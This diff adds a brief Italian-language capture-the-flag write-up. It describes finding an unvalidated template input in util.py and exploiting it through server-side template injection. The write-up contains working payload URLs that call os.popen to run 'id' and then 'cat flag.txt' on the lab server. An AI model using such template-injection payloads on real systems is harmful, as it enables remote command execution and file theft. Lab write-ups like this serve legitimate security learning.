@@ -1,0 +1,18 @@
+Dockerfile ottenuto sono essenzialmente le istruzione dell'ambiente che ho scaricato
+È sempre worth guardarle
+
+Do un'occhiata a tutte le funzioni all'interno della cartella
+Da util.py capisco che posso procedere con del template injection
+L'input che passo non viene controllato
+
+Da sito 
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#direct-access-to-os-from-templatenamespace
+
+Inserisco il template e funziona.
+aggiungo popen e read
+http://134.122.104.91:30915/?text=${self.module.runtime.util.os.popen(%22id%22).read()}
+Questo è l'URL
+
+Lo uso ora per la flag
+http://134.122.104.91:30915/?text=${self.module.runtime.util.os.popen("cat flag.txt").read()}
+done!
